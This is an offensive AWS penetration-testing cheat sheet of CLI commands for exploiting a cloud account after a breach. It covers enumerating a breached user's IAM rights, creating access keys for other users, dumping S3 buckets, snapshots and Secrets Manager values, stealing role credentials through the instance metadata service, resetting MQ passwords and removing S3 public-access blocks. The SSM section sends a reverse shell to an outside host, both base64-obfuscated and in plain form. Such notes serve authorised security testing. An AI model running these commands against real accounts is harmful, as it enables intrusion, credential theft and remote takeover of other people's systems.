# AWS CLI

## Profile

Define different profile in `~/.aws/credentials` and use them with `aws --profile <name>`

```bash
[profile_1]
aws_access_key_id=ASIAI44QH8DHBEXAMPLE
aws_secret_access_key=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
aws_session_token=fcZib3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZVERYLONGSTRINGEXAMPLE
```

## Enumeration

- [Enumerate IAM](https://github.com/andresriancho/enumerate-iam) is a good tool to quickly identify permissions of credentials.
- [Cloud_enum](https://github.com/initstring/cloud_enum) to look for public s3 bucket from a company name
- [Pacu - AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu) can be used to automate some discovery across regions for example
- [AWS_Scripts](https://github.com/cloudbreach/CloudBreach_AWSScripts) can be use full for S3 versionning recovery

## Tips

**If you have read access, ALWAYS look for CRUD permissions**, you may be able to create / update a user including its password and pivot

Once you have a shell in a AWS instance / container / lambda function, 

- use `env` command and look for any variables / urls that can indicate credentials.
- look for `.aws/config` or `.aws/credentials` files
- check for Instance Metadata Service (IMDS) 

## S3

`http://[bucketname].s3-website-[region].amazonaws.com/`

```bash
# s3 commands
aws s3 ls s3://<bucket-name>
aws s3 cp s3://<bucket-name>/<file-name> .
aws s3 sync s3://<bucket-name>/ .
aws s3 sync s3://bucket . --no-sign-request # No sign-in required
./s3BucketVersionDumper.sh # Retrieve buckets versions
aws s3 website s3://<bucket-name> --index-document index.html # Enable static website hosting

# s3api commands
aws s3api list-object-versions --bucket bucket --no-sign-request
aws s3api create-bucket --bucket <domain-name|bucket-name> --region <region>
aws s3api get-public-access-block --bucket <domain-name|bucket-name> # Get public access block configuration
aws s3api delete-public-access-block --bucket <domain-name|bucket-name> # Delete public access block configuration

# Upload a new policy that allows public access
cat policy.json
{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "PublicReadForStaticWebsite",
        "Effect": "Allow",
        "Principal": "*",
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::<domain-name|bucket-name>/*"
      }
    ]
}
aws s3api put-bucket-policy --bucket <domain-name|bucket-name> --policy file://policy.json

```

## IAM

```bash
# User related
aws sts get-caller-identity # Retrieve Account ID
aws iam get-user --user-name <breached_username> # Return information about the user
aws iam list-user-policies –user-name <breached_username> # Return a list of policies
aws iam list-attached-user-policies --user-name <breached_username> # Return in-line policies
aws iam get-user-policy --user-name <breached_username> --policy-name <policyname> # Return specific in-line policy
aws iam list-users # list users in IAM
aws iam create-access-key --user-name <user-name> # Create access key for the specified user
aws iam add-user-to-group --group-name <group-name> --user-name <user-name> # add user to a defined group

# Role related
aws iam list-attached-role-policies --role-name <role-name>

# Policy information
aws iam get-policy --policy-arn <policy-arn>
aws iam get-policy-version --policy-arn <policy-arn> --version-id v1
```

## EC2

```bash
aws ec2 describe-instances # decribe EC2 instances
aws ec2 describe-instances --filter Name=tag:Name,Values=<name> 
aws ec2 describe-instances --filter Name=instance-id,Values=<instance-id>
aws ec2 describe-instance-attribute --instance-id <instance-id> --attribute <attribute-name> # Read attribute from ec2 instance (userData)
# Look for attribute-name in all ec2 instances
for i in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do echo $i && aws ec2 describe-instance-attribute --instance-id $i --attribute <attribute-name> ; done
aws ec2 describe-volumes # list EBS volumes
aws ec2 describe-snapshots # describe EBS snapshots
aws ec2 describe-snapshots --region <region> 
aws ec2 describe-snapshots --region <region> --owner-ids <account-id> # List only snapshots available for account-id

dsnap --region <region> list # List only snapshots available for current aws account
dsnap --region <region> get <snap-id> # download snapshots

# Mount snapshot in container to explore it
cd <dsnap_pwd>
sudo IMAGE=snapshot.img make docker/run
```

## SSM

```bash
aws ssm send-command 
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --comment "ReverseShell" 
    --parameters '{"commands":["echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEwLjEyLzg0NDMgMD4mMQo= | base64 -d | bash"]}'
#   --parameters '{"commands":["bash -i >& /dev/tcp/10.0.10.12/8443 0>&1"]}' 
    --output text   

# Get result
aws ssm list-command-invocations \
    --command-id <sh-command-id> \
    --details
```

## Secrets Manager

```bash
aws secretsmanager list-secrets # list secrets
aws secretsmanager get-secret-value --secret-id <secret-id>
aws secretsmanager get-secret-value --secret-id <secret-id> --version-id <version-id> 
```

## IMDS

```bash
# Metadata
curl http://169.254.169.254/latest/meta-data/ 
curl http://169.254.169.254/latest/meta-data/hostname # instance's hostname
curl http://169.254.169.254/latest/meta-data/ami-id # instance's AMI ID
curl http://169.254.169.254/latest/meta-data/instance-type # instance's type
curl http://169.254.169.254/latest/meta-data/security-groups # instance security groups
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> # instance's IAM role creds (if a role is attached to the instance)

# Dynamic data
curl http://169.254.169.254/latest/dynamic

# User data
curl http://169.254.169.254/latest/user-data
```

## SNS 

```bash
aws sns subscribe --topic-arn <topic-arn> --protocol email --notification-endpoint <email> # Subscribe to a topic
# Subscription needs to be validated by checking your mail
```

## Lambda

Lambda URL format : `https://[NAME].execute-api.[REGION].amazonaws.com`

```bash
aws lambda list-functions # list functions
aws lambda get-function --function-name <function-name> # get function
# Find URL of lambda function
aws lambda get-policy --function-name <function-name> # get information about lambda's function policy (URL)
aws apigateway get-rest-apis # Can also be used to gather information to build URL
```

## DynamoDB

```bash
aws dynamodb list-tables # list tables
aws dynamodb scan --table-name <table-name> # select * from tables
```

## ECR 

Check kubernetes-docker.md for tips to create a reverse shell image

```bash
aws ecr describe-repositories # list repositories
aws ecr describe-images --repository-name <repository-name> # list images from a repository

# Login to AWS ECR (rights permissions needed)
aws ecr get-login-password --region us-east-1 | sudo docker login --username AWS --password-stdin <registry-id>.dkr.ecr.us-east-1.amazonaws.com
# And then push the image
sudo docker push <registry-id>.dkr.ecr.us-east-1.amazonaws.com/<repository-id>:latest

```

## AWS SSO Portal

```bash
# Enumerate SSO 
aws sso-admin list-instances # list instances
aws sso-admin list-permission-sets --instance <instance-arn> # list permission sets
aws sso-admin describe-permission-set --instance <instance-arn> --permission-set-arn <permission-set-arn> # describe a permission set
```

## MQ

```bash
# List brokers
aws mq list-brokers
aws mq describe-broker --broker-id <broker-id>
aws mq update-user --broker-id <broker-id> --username <user-name> --password <new-password>
aws mq describe-user --broker-id <broker-id> --username <user-name>
# Necessary to reboot the broker for any changes to be applied
aws mq reboot-broker --broker-id <broker-id>
```